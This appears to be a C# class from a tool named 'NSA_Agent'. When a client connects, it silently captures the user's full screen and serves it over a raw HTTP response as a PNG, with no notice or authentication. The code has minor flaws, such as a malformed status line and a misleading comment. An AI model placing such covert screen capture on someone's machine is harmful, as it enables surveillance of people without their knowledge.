using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Windows.Forms;
using System.IO;

namespace NSA_Agent
{

    public class Instance
    {

        Socket clientSocket;

        public Instance(Socket s)
        {
            clientSocket = s;
        }

        public void run()
        {


            String html = "hello world";
            String line1, line2, line3, line4, headers;


            MemoryStream memoryStream = new MemoryStream();
            
            CaptureScreenShot().Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
            
    
            byte[] byteArray = memoryStream.ToArray();
          
          



            line1 = "HTTP 1.0 200 OK";
            line2 = "Date: " + DateTime.Now.ToLongDateString();
            line3 = "Content-Type: image/png";
            line4 = "Content-Length: " + byteArray.Length ;

            headers = line1 + "\n" + line2 + "\n" + line3 + "\n" + line4 + "\n\n";


            clientSocket.Send(System.Text.UTF8Encoding.UTF8.GetBytes(headers), System.Text.UTF8Encoding.UTF8.GetBytes(headers).Length, 0); //send the HTTP headers
            clientSocket.Send(byteArray); //send HTML
         

            
            clientSocket.Disconnect(false);
        }

        private Bitmap CaptureScreenShot() { 
            // get the bounding area of the screen containing (0,0) 
            // remember in a multidisplay environment you don't know which display holds this point 
            Rectangle bounds = Screen.GetBounds(Point.Empty);   
            
            // create the bitmap to copy the screen shot to 
            Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);   
            
            // now copy the screen image to the graphics device from the bitmap 
            using (Graphics gr = Graphics.FromImage(bitmap)) { 
                gr.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size); 
            }
            
            return bitmap; 
        
        }


    }
       
}
